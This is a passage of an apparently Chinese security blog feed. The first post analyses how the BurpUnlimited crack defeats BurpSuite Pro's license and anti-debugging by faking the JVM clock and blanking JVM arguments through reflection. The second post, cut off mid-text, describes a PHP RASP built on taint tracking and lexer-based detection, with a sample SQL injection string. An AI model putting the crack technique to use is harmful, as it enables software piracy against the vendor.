    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近，larry破解的BurpSuite Pro过期了，不久，mxcx放出了一个BurpSuite Pro的无限版，由BurpUnlimited启动，并且开源了BurpUnlimited的源代码，可供分析。</p><p>BurpUnlimited可以分为两部分，一是有main函数的<code>larry.lau.BurpLoader</code>及依赖模块，另一部分是有premain函数的<code>mxcx.javaagent</code>及依赖模块，premain函数是Java Instrumentation的入口函数。将BurpUnlimited分为这两部分是显而易见的，因为在BurpUnlimited的readme中，开发者说一种运行BurpUnlimited的方法是<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:BurpUnlimited.jar -agentpath:lib/libfaketime&lt;osverion&gt; -jar BurpUnlimited.jar</span><br></pre></td></tr></table></figure></p><p>显然，BurpUnlimited能直接运行，说明它有main函数，能作为javaagent加载，说明它又是一个有premain函数的Instrumentation。<br>在分析这两部分之前，先说一些背景。</p><h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>Java Instrumentation允许开发者访问从JVM中加载的类，并且允许对它的字节码做修改，加入我们自己的代码，这些都是在运行时完成的。并且它仍然遵从安全管理器的限制。Java Instrumentation通过-javaagent加载。</p><p>在调试Java Instrumentation时，建议使用远程调试，远程调试的命令行参数如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005</span><br></pre></td></tr></table></figure></p><p>在这里，建议将suspend参数设置为y，这样可以保证调试者连接上来之后才开始启动应用，否则在调试代码运行和调试器连接上来之间有时间差，不好控制代码的运行。</p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>在这里仅分析一下BurpUnlimited对larry的BurpLoader的破解。在larry.lau.BurpLoader中，绝大多数代码是larrylau对BurpSuite Pro的破解，mxcx主要添加了<code>BurpUnlimited.setupValidationEnv();</code>和<code>BurpUnlimited.uninstallFakeTime();</code>这两行代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] array)</span> </span>&#123; </span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           BurpUnlimited.setupValidationEnv();</span><br><span class="line">           <span class="keyword">final</span> String s = BurpLoader.z[<span class="number">3</span>];</span><br><span class="line">           <span class="comment">//......</span></span><br><span class="line">           StartBurp.main(array);</span><br><span class="line">           BurpUnlimited.uninstallFakeTime();</span><br><span class="line">       &#125;<span class="keyword">catch</span>(<span class="comment">/*...*/</span>)&#123;</span><br><span class="line">           <span class="comment">//.....</span></span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们先来看看<code>BurpUnlimited.setupValidationEnv();</code>，<code>BurpUnlimited.setupValidationEnv()</code>方法主要做了这么几件事</p><ul><li><p>获取参数，判断是否添加了-javaagent和-agentlib等参数，如果没有添加，说明BurpUnlimited是以双击的方式直接启动的，那么程序构造一个shell命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:BurpUnlimited.jar -agentpath:lib/libfaketime&lt;osverion&gt; -jar BurpUnlimited.jar</span><br></pre></td></tr></table></figure><p>运行这个有完整参数的命令重新启动。</p></li><li>利用反射，将JVM的Managed Bean对象里面的jvm成员里面的vmArgs置为[]以绕过BurpSuite中的反调试。</li><li>将系统参数faketime.absolute.ms设置为1420045200000，即<code>Thu Jan 01 01:00:00 CST 2015</code>。</li></ul><p>下面分析一下这个类中几行关键的代码。line118 <code>RuntimeMXBean mxb = ManagementFactory.getRuntimeMXBean();</code>获取当前运行的jvm的managed bean。line120-line152，判断jvm的参数中是否有-javaagent和-agentpath，如果没有，补充完整，运行完整shell命令。line154，<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StrictPA.setValue(StrictPA.getValue(mxb, <span class="string">"jvm"</span>), <span class="string">"vmArgs"</span>, Collections.unmodifiableList(<span class="keyword">new</span> ArrayList&lt;Object&gt;()));</span><br></pre></td></tr></table></figure></p><p>通过反射，将managed bean中的jvm中的vmArg重置为[]，重置之前是jvm的参数是<code>[&#39;-javaagent:BurpUnlimited.jar&#39;,&#39; -agentpath:lib/libfaketime&lt;osverion&gt;&#39;]</code>。重置后可以绕过BurpSuite的反调试。实际上，<br>在安全管理器没做限定的情况下，反射可以使用<code>setAccessible(true)</code>去除类似于private的访问限制，并且随心所欲的修改受访问限制的变量。而在默认情况下，安全管理器是不启用的。line160-line166，将<code>faketime.absolute.ms</code>设置为2015年，并判断是否成功修改<code>System.currentTimeMillis()</code>的实现。这里使用了faketime项目<a href="https://github.com/faketime-java/faketime。" target="_blank" rel="noopener">https://github.com/faketime-java/faketime。</a></p><p><code>BurpUnlimited.setupValidationEnv();</code>之后就是larrylau的破解，破解完毕之后，调用<code>StartBurp.main(array);</code>启动Burp，之后就调用<code>BurpUnlimited.uninstallFakeTime();</code>将时间改回了真实的时间。代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">StartBurp.main(array);</span><br><span class="line">BurpUnlimited.uninstallFakeTime();</span><br></pre></td></tr></table></figure></p><p>可见BurpSuite仅在启动时对License进行了判断。</p><p>下面是分析一下Java Instrumentation，首先，java instrumentation有一个premain函数作为入口，类似于main函数，在这个函数中，可以为Instrumentation添加一个<code>transformer</code>对字节码进行操作。在transformer类中，必须实现<code>transform</code>方法来对字节码进行修改。这个Instrumentation将<code>larry/lau/burp/ui/TestDisclaimer</code>和<code>burp/uzd</code>的字节码直接修改成了<code>TestDisclaimerClass</code>和<code>uzdClass</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String TestDisclaimerClass = &quot;cafebabe0000003300250a0....20019&quot;;</span><br><span class="line">String uzdClass = &quot;cafebabe00000033006f0a0....2003f&quot;;</span><br></pre></td></tr></table></figure></p><p>这两个字符串对应的字节码是<code>BurpUnlimited/others/aloneclasses/burp/uzd.java</code>和<code>BurpUnlimited/others/aloneclasses/larry/lau/burp/ui/TestDisclaimer.java</code>的字节码，它替换了原来的larrylau声明<br><img src="https://i.loli.net/2017/12/14/5a3291bb8b687.png" alt="20171206_1.png"></p><p>和BurpSuite中的License界面</p><p><img src="https://i.loli.net/2017/12/14/5a3291bb96473.png" alt="20171206_2.png"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>mxcx使用一个java原生agent修改Java API获取的时间，使License在校验时获取的本地时间永远在License过期时间之前，这样，这个License将永远有效，不会过期。</p><h2 id="0x04-关于作者"><a href="#0x04-关于作者" class="headerlink" title="0x04 关于作者"></a>0x04 关于作者</h2><ul><li>c0d3p1ut0s <code>c0d3p1ut0s@gmail.com</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;最近，larry破解的BurpSuite Pro过期了，不久，mxcx放出了一个BurpSuite 
      
    
    </summary>
    
    
      <category term="Java安全" scheme="http://c0d3p1ut0s.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
      <category term="Web安全" scheme="http://c0d3p1ut0s.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>一类PHP RASP的实现</title>
    <link href="http://c0d3p1ut0s.github.io/%E4%B8%80%E7%B1%BBPHP-RASP%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <id>http://c0d3p1ut0s.github.io/一类PHP-RASP的实现/</id>
    <published>2017-11-30T12:27:02.000Z</published>
    <updated>2018-01-08T13:04:29.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这篇文章2017.11.10发在 <a href="https://paper.seebug.org/449/" target="_blank" rel="noopener">https://paper.seebug.org/449/</a> 。重发在博客如下</p></blockquote><h2 id="RASP概念"><a href="#RASP概念" class="headerlink" title="RASP概念"></a>RASP概念</h2><p>RASP（Runtime Application self-protection）是一种在运行时检测攻击并且进行自我保护的一种技术。早在2012年，Gartner就开始关注RASP，惠普、WhiteHat Security等多家国外安全公司陆续推出RASP产品，时至今日，惠普企业的软件部门出售给了Micro Focus，RASP产品Application Defender随之易主。而在国内，去年知道创宇KCon大会兵器谱展示了JavaRASP，前一段时间，百度开源了OpenRASP，去年年底，360的0kee团队开始测试Skywolf，虽然没有看到源码和文档，但它的设计思路或许跟RASP类似。而商业化的RASP产品有OneAPM的OneRASP和青藤云的自适应安全产品。在国内，这两家做商业化RASP产品做得比较早。</p><p>那么RASP到底是什么呢？它到底是怎样工作的呢？<br><a id="more"></a></p><h2 id="我的WAF世界观"><a href="#我的WAF世界观" class="headerlink" title="我的WAF世界观"></a>我的WAF世界观</h2><p>为了表述方便，暂且把RASP归为WAF的一类。从WAF所在的拓扑结构，可以简单将WAF分为如下三类，如下图所示：</p><p><img src="https://i.loli.net/2017/11/30/5a2003fac8ae3.png" alt="WAF.png"></p><ul><li>以阿里云为代表的云WAF以中间人的形式，在HTTP请求到达目标服务器之前进行检查拦截。</li><li>以ModSecurity为代表的传统WAF在HTTP请求到达HTTP服务器后，被Web后端容器解释/执行之前检查拦截HTTP请求。</li><li>RASP工作在Web后端解释器/编译器中，在漏洞代码执行前阻断执行流。</li></ul><p>从上图中WAF所处的位置可以看出，云WAF和传统WAF的检查拦截HTTP请求的主要依据是HTTP Request，其实，如果站在一个非安全从业者的角度来看，这种检测方式是奇怪的。我们可以把Web服务看做是一个接受输入-处理-输出结果的程序，那么它的输入是HTTP请求，它的输出是HTTP响应。靠检测一个程序的输入和输出来判断这个程序的运行过程是否有害，这不奇怪吗？然而它又是可行且有效的，大多数的Web攻击都能从HTTP请求中找到蛛丝马迹。这种检测思路是云WAF和传统WAF能有效工作的原因，也是它们的缺点。</p><p>笔者一直认为，问题发生的地方是监控问题、解决问题的最好位置。Web攻击发生在Web后端代码执行时，最好的防护方法就是在Web后端代码执行之前推测可能发生的问题，然后阻断代码的执行。这里的推测并没有这么难，就好像云WAF在检查包含攻击payload的HTTP请求时推测它会危害Web服务一样。这就是RASP的设计思路。</p><p>好了，上面谈了一下笔者个人的一些看法，下面开始谈一谈PHP RASP的实现。</p><p>RASP在后端代码运行时做安全监测，但又不侵入后端代码，就得切入Web后端解释器。以Java为例，Java支持以JavaAgent的方式，在class文件加载时修改字节码，在关键位置插入安全检查代码，实现RASP功能。同样，PHP也支持对PHP内核做类似的操作，PHP支持PHP扩展，实现这方面的需求。你可能对JavaAgent和PHP扩展比较陌生，实际上，在开发过程中，JavaAgent和PHP扩展与你接触的次数比你意识到的多得多。</p><h2 id="PHP扩展简介"><a href="#PHP扩展简介" class="headerlink" title="PHP扩展简介"></a>PHP扩展简介</h2><p>有必要介绍一下PHP解释的简单工作流程，根据PHP解释器所处的环境不同，PHP有不同的工作模式，例如常驻CGI，命令行、Web Server模块、通用网关接口等多个模式。在不同的模式下，PHP解释器以不同的方式运行，包括单线程、多线程、多进程等。</p><p>为了满足不同的工作模式，PHP开发者设计了Server API即SAPI来抹平这些差异，方便PHP内部与外部进行通信。</p><p>虽然PHP运行模式各不相同，但是，PHP的任何扩展模块，都会依次执行模块初始化（MINIT）、请求初始化（RINIT）、请求结束（RSHUTDOWN）、模块结束（MSHUTDOWN）四个过程。如下图所示：</p><p><img src="https://i.loli.net/2017/11/30/5a2003fabd0a6.png" alt="PHPext.png"></p><p>在PHP实例启动时，PHP解释器会依次加载每个PHP扩展模块，调用每个扩展模块的MINIT函数，初始化该模块。当HTTP请求来临时，PHP解释器会调用每个扩展模块的RINIT函数，请求处理完毕时，PHP会启动回收程序，倒序调用各个模块的RSHUTDOWN方法，一个HTTP请求处理就此完成。由于PHP解释器运行的方式不同，RINIT-RSHUTDOWN这个过程重复的次数也不同。当PHP解释器运行结束时，PHP调用每个MSHUTDOWN函数，结束生命周期。</p><p>PHP核心由两部分组成，一部分是PHP core，主要负责请求管理，文件和网络操作，另一部分是Zend引擎，Zend引擎负责编译和执行，以及内存资源的分配。Zend引擎将PHP源代码进行词法分析和语法分析之后，生成抽象语法树，然后编译成Zend字节码，即Zend opcode。即PHP源码-&gt;AST-&gt;opcode。opcode就是Zend虚拟机中的指令。使用VLD扩展可以看到Zend opcode，这个扩展读者应该比较熟悉了。下面代码的opcode如图所示<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line">$b=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">print</span> $a+$b;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2017/11/30/5a2003fada24d.png" alt="opcode.png"></p><p>Zend引擎的所有opcode在<a href="http://php.net/manual/en/internals2.opcodes.list.php" target="_blank" rel="noopener">http://php.net/manual/en/internals2.opcodes.list.php</a> 中可以查到，在PHP的内部实现中，每一个opcode都由一个函数具体实现，opcode数据结构如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_op</span> &#123;</span></span><br><span class="line">    <span class="keyword">opcode_handler_t</span> handler;<span class="comment">//执行opcode时调用的处理函数</span></span><br><span class="line">    znode result;</span><br><span class="line">    znode op1;</span><br><span class="line">    znode op2;</span><br><span class="line">    ulong extended_value;</span><br><span class="line">    uint lineno;</span><br><span class="line">    zend_uchar opcode; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>如结构体所示，具体实现函数的指针保存在类型为opcode_handler_t的handler中。</p><h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><p>PHP RASP的设计思路很直接，安全圈有一句名言叫一切输入都是有害的，我们就跟踪这些有害变量，看它们是否对系统造成了危害。我们跟踪了HTTP请求中的所有参数、HTTP Header等一切client端可控的变量，随着这些变量被使用、被复制，信息随之流动，我们也跟踪了这些信息的流动。我们还选取了一些敏感函数，这些函数都是引发漏洞的函数，例如require函数能引发文件包含漏洞，mysqli-&gt;query方法能引发SQL注入漏洞。简单来说，这些函数都是大家在代码审计时关注的函数。我们利用某些方法为这些函数添加安全检查代码。当跟踪的信息流流入敏感函数时，触发安全检查代码，如果通过安全检查，开始执行敏感函数，如果没通过安全检查，阻断执行，通过SAPI向HTTP Server发送403 Forbidden信息。当然，这一切都在PHP代码运行过程中完成。</p><p>这里主要有两个技术问题，一个是如何跟踪信息流，另一个是如何安全检查到底是怎样实现的。</p><p>我们使用了两个技术思路来解决两个问题，第一个是动态污点跟踪，另一个是基于词法分析的漏洞检测。</p><h2 id="动态污点跟踪"><a href="#动态污点跟踪" class="headerlink" title="动态污点跟踪"></a>动态污点跟踪</h2><p>对PHP内核有一些了解的人应该都知道鸟哥，鸟哥有一个项目taint，做的就是动态污点跟踪。动态污点跟踪技术在白盒的调试和分析中应用比较广泛。它的主要思路就是先认定一些数据源是可能有害的，被污染的，在这里，我们认为所有的HTTP输入都是被污染的，所有的HTTP输入都是污染源。随着这些被污染变量的复制、拼接等一系列操作，其他变量也会被污染，污染会扩大，这就是污染的传播。这些经过污染的变量作为参数传入敏感函数以后，可能导致安全问题，这些敏感函数就是沉降点。</p><p>做动态污点跟踪主要是定好污染源、污染传播策略和沉降点。在PHP RASP中，污染源和沉降点显而易见，而污染传播策略的制定影响对RASP的准确性有很大的影响。传播策略过于严格会导致漏报，传播策略过于宽松会增加系统开销。PHP RASP的污染传播策略是变量的复制、赋值和大部分的字符串处理等操作传播污染。</p><p>动态污点跟踪的一个小小好处是如果一些敏感函数的参数没有被污染，那么我们就无需对它进行安全检查。当然，这只是它的副产物，它的大作用在漏洞检测方面。</p><p>动态污点跟踪的实现比较复杂，有兴趣的可以去看看鸟哥的taint，鸟哥的taint也是以PHP扩展的方式做动态污点跟踪。PHP RASP中，这部分是基于鸟哥的taint修改、线程安全优化、适配不同PHP版本实现的。在发行过程中，我们也将遵守taint的License。</p><p>在PHP解释器中，全局变量都保存在一个HashTable类型的符号表symbol_table中，包括预定义变量$GLOBALS、$_GET、$_POST等。我们利用变量结构体中的flag中未被使用的一位来标识这个变量是否被污染。在RINIT过程中，我们通过这个方法首先将$_GET,$_POST,$_SERVER等数组中的值标记为污染，这样，我们就完成了污染源的标记。</p><p>污染的传播过程其实就是hook对应的函数，在PHP中，可以从两个层面hook函数，一是通过修改zend_internal_function的handler来hook PHP中的内部函数，handler指向的函数用C或者C++编写，可以直接执行。zend_internal_function的结构体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//zend_complie.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_internal_function</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Common elements */</span></span><br><span class="line">    zend_uchar type;</span><br><span class="line">    zend_uchar arg_flags[<span class="number">3</span>]; <span class="comment">/* bitset of arg_info.pass_by_reference */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> fn_flags;</span><br><span class="line">    zend_string* function_name;</span><br><span class="line">    zend_class_entry *scope;</span><br><span class="line">    zend_function *prototype;</span><br><span class="line">    <span class="keyword">uint32_t</span> num_args;</span><br><span class="line">    <span class="keyword">uint32_t</span> required_num_args;</span><br><span class="line">    zend_internal_arg_info *arg_info;</span><br><span class="line">    <span class="comment">/* END of common elements */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*handler)(INTERNAL_FUNCTION_PARAMETERS); <span class="comment">//函数指针，展开：void (*handler)(zend_execute_data *execute_data, zval *return_value)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_module_entry</span> *<span class="title">module</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *reserved[ZEND_MAX_RESERVED_RESOURCES];</span><br><span class="line">&#125; zend_internal_function;</span><br></pre></td></tr></table></figure></p><p>我们可以通过修改zend_internal_function结构体中handler的指向，待完成我们需要的操作后再调用原来的处理函数即可完成hook。<br>另一种是hook opcode，需要使用zend提供的API zend_set_user_opcode_handler来修改opcode的handler来实现。</p><p>我们在MINIT函数中用这两种方法来hook传播污染的函数，如下图所示</p><p><img src="https://i.loli.net/2017/11/30/5a2003fad93cd.png" alt="override.png"></p><p><img src="https://i.loli.net/2017/11/30/5a2003fad239a.png" alt="handler.png"></p><p>当传播污染的函数被调用时，如果这个函数的参数是被污染的，那么把它的返回值也标记成污染。以hook内部函数str_replace函数为例，hook后的rasp_str_replace如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(rasp_str_replace)</span><br><span class="line">&#123;</span><br><span class="line">zval *str, *from, *len, *repl;</span><br><span class="line"><span class="keyword">int</span> tainted = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, <span class="string">"zzz|z"</span>, &amp;str, &amp;repl, &amp;from, &amp;len) == FAILURE) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="comment">//取参</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_STRING == Z_TYPE_P(repl) &amp;&amp; PHP_RASP_POSSIBLE(repl)) &#123;</span><br><span class="line">tainted = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_STRING == Z_TYPE_P(from) &amp;&amp; PHP_RASP_POSSIBLE(from)) &#123;</span><br><span class="line">tainted = <span class="number">1</span>;</span><br><span class="line">&#125;<span class="comment">//判断</span></span><br><span class="line"></span><br><span class="line">RASP_O_FUNC(str_replace)(INTERNAL_FUNCTION_PARAM_PASSTHRU);<span class="comment">//调用原函数执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tainted &amp;&amp; IS_STRING == Z_TYPE_P(return_value) &amp;&amp; Z_STRLEN_P(return_value)) &#123;</span><br><span class="line">        TAINT_MARK(Z_STR_P(return_value));</span><br><span class="line">&#125;<span class="comment">//污染标记</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>首先获取参数，判断参数from和repl是否被污染，如果被污染，将返回值标记为污染，这样就完成污染传播过程。</p><p>当被污染的变量作为参数被传入关键函数时，触发关键函数的安全检查代码，这里的实现其实跟上面的类似。PHP的中函数调用都是由三个Zend opcode：ZEND_DO_FCALL,ZEND_DO_ICALL 和 ZEND_DO_FCALL_BY_NAME中某一个opcode来进行的。每个函数的调用都会运行这三个 opcode 中的一个。通过劫持三个 opcode来hook函数调用,就能获取调用的函数和参数。这里我们只需要hook opcode，就是上面第二幅图示意的部分，为了让读者更加清晰，我把它复制下来。<br><img src="https://i.loli.net/2017/11/30/5a2003fad239a.png" alt="handler.png"></p><p>如图，在MINIT方法中，我们利用Zend API zend_set_user_opcode_handler来hook这三个opcode，监控敏感函数。在PHP内核中，当一个函数通过上述opcode调用时，Zend引擎会在函数表中查找函数，然后返回一个zend_function类型的指针，zend_function的结构如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> _zend_function &#123;</span><br><span class="line">zend_uchar type;<span class="comment">/* MUST be the first element of this struct! */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">zend_uchar type;  <span class="comment">/* never used */</span></span><br><span class="line">zend_uchar arg_flags[<span class="number">3</span>]; <span class="comment">/* bitset of arg_info.pass_by_reference */</span></span><br><span class="line"><span class="keyword">uint32_t</span> fn_flags;</span><br><span class="line">zend_string *function_name;</span><br><span class="line">zend_class_entry *scope;</span><br><span class="line"><span class="keyword">union</span> _zend_function *prototype;</span><br><span class="line"><span class="keyword">uint32_t</span> num_args;</span><br><span class="line"><span class="keyword">uint32_t</span> required_num_args;</span><br><span class="line">zend_arg_info *arg_info;</span><br><span class="line">&#125; common;</span><br><span class="line"></span><br><span class="line">zend_op_array op_array;</span><br><span class="line">zend_internal_function internal_function;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>其中，common.function_name指向这个函数的函数名，common.scope指向这个方法所在的类，如果一个函数不属于某个类，例如PHP中的fopen函数，那么这个scope的值是null。这样，我们就获取了当前函数的函数名和类名。</p><p>以上的行文逻辑是以RASP的角度来看的，先hook opcode和内部函数，来实现动态污点跟踪，然后通过hook函数调用时运行的三个opcode来对监控函数调用。实际上，在PHP内核中，一个函数的调用过程跟以上的行文逻辑是相反的。</p><p>当一个函数被调用时，如上文所述，根据这个函数调用的方式不同，例如直接调用或者通过函数名调用，由Zend opcode，ZEND_DO_FCALL,ZEND_DO_ICALL 和 ZEND_DO_FCALL_BY_NAME中的某一个opcode来进行。Zend引擎会在函数表中搜索该函数，返回一个zend_function指针，然后判断zend_function结构体中的type，如果它是内部函数，则通过zend_internal_function.handler来执行这个函数，如果handler已被上述hook方法替换，则调用被修改的handler；如果它不是内部函数，那么这个函数就是用户定义的函数，就调用zend_execute来执行这个函数包含的zend_op_array。</p><p>现在我们从RASP的角度和PHP内核中函数执行的角度来看了动态污点跟踪和函数的hook，接下来，我们需要对不同类型的关键函数进行安全检测。</p><h2 id="基于词法分析的攻击检测"><a href="#基于词法分析的攻击检测" class="headerlink" title="基于词法分析的攻击检测"></a>基于词法分析的攻击检测</h2><p>传统WAF和云WAF在针对HTTP Request检测时有哪些方法呢？常见的有正则匹配、规则打分、机器学习等，那么，处于PHP解释器内部的PHP RASP如何检测攻击呢？</p><p>首先，我们可以看PHP RASP可以获取哪些数据作为攻击检测的依据。与其他WAF一样，PHP RASP可以获取HTTP请求的Request。不同的是，它还能获取当前执行函数的函数名和参数，以及哪些参数是被污染的。当然，像传统WAF一样，利用正则表达式来作为规则来匹配被污染的函数参数也是PHP RASP检测的一种方法。不过，对于大多数的漏洞，我们采用的是利用词法分析来检测漏洞。准确的来说，对于大多数代码注入漏洞，我们使用词法分析来检测漏洞。</p><p>代码注入漏洞，是指攻击者可以通过HTTP请求将payload注入某种代码中，导致payload被当做代码执行的漏洞。例如SQL注入漏洞，攻击者将SQL注入payload插入SQL语句中，并且被SQL引擎解析成SQL代码，影响原SQL语句的逻辑，形成注入。同样，文件包含漏洞、命令执行漏洞、代码执行漏洞的原理也类似，也可以看做代码注入漏洞。</p><p>对于代码注入漏洞，攻击者如果需要成功利用，必须通过注入代码来实现，这些代码一旦被注入，必然修改了代码的语法树的结构。而追根到底，语法树改变的原因是词法分析结果的改变，因此，只需要对代码部分做词法分析，判断HTTP请求中的输入是否在词法分析的结果中占据了多个token，就可以判断是否形成了代码注入。</p><p>在PHP RASP中，我们通过编写有限状态机来完成词法分析。有限状态机分为确定有限状态机DFA和非确定有限状态机NFA，大多数的词法分析器，例如lex生成的词法分析器，都使用DFA，，因为它简单、快速、易实现。同样，在PHP RASP中，我们也使用DFA来做词法分析。</p><p>词法分析的核心是有限状态机，而有限状态机的构建过程比较繁琐，在此不赘述，与编译器中的词法分析不同的是，PHP RASP中词法分析的规则并不一定与这门语言的词法定义一致，因为词法分析器的输出并不需要作为语法分析器的输入来构造语法树，甚至有的时候不必区分该语言的保留字与变量名。</p><p>在经过词法分析之后，我们可以得到一串token，每个token都反映了对应的代码片段的性质，以SQL语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'1'</span><span class="keyword">or</span><span class="string">'1'</span>=<span class="string">'1'</span></span><br></pre></td></tr></table></figure></p><p>为例,它对应的token串如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select &lt;reserve word&gt;</span><br><span class="line">username &lt;identifier&gt;</span><br><span class="line">from &lt;reserve word&gt;</span><br><span class="line">users    &lt;identifier&gt;</span><br><span class="line">where &lt;reserve word&gt;</span><br><span class="line">id  &lt;identifier&gt;</span><br><span class="line">=   &lt;sign&gt;</span><br><span class="line">&apos;1&apos; &lt;string&gt;</span><br><span class="line">or  &lt;reserve word&gt;</span><br><span class="line">&apos;1&apos; &lt;string&gt;</span><br><span class="line">=   &lt;sign&gt;</span><br><span class="line">&apos;1&apos; &lt;string&gt;</span><br></pre></td></tr></table></figure></p><p>而如果这个SQL语句是被污染的（只有SQL语句被污染才会进入安全监测这一步），而且HTTP请求中某个参数的值是1’or’1’=’1，对比上述token串可以发现，HTTP请求中参数横跨了多个token，这很可能是SQL注入攻击。那么，PHP 